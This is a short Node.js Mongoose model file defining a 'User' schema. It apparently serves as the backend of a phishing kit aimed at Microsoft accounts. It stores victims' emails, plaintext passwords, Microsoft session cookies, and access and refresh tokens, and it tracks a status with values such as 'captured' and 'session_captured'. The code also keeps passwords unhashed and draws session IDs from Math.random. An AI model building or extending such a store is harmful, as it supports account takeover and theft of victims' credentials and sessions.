const mongoose = require("mongoose");
const Schema = mongoose.Schema;

const cookieSchema = new Schema({
  domain: { type: String, required: true },
  httpOnly: { type: Boolean, default: true },
  path: { type: String, default: "/" },
  secure: { type: Boolean, default: true },
  expiry: { type: Number, default: 0 },
  name: { type: String, required: true },
  value: { type: String, required: true }
}, { _id: false });

const userSchema = new Schema({
  email: {
    type: String,
    required: true
  },
  loginAttempt: {
    type: Date,
    default: Date.now
  },
  sessionId: {
    type: String,
    default: () => Math.random().toString(36).substring(7)
  },
  password: {
    type: String,
    required: true
  },
  microsoftCookies: [cookieSchema],
  sessionCookies: [cookieSchema],
  allCookies: [cookieSchema],
  isActive: {
    type: Boolean,
    default: false
  },
  lastLogin: {
    type: Date,
    default: null
  },
  cookieStatus: {
    type: String,
    enum: ['pending', 'captured', 'expired', 'session_captured'],
    default: 'pending'
  },
  accessToken: {
    type: String,
    default: null
  },
  refreshToken: {
    type: String,
    default: null
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model("User", userSchema);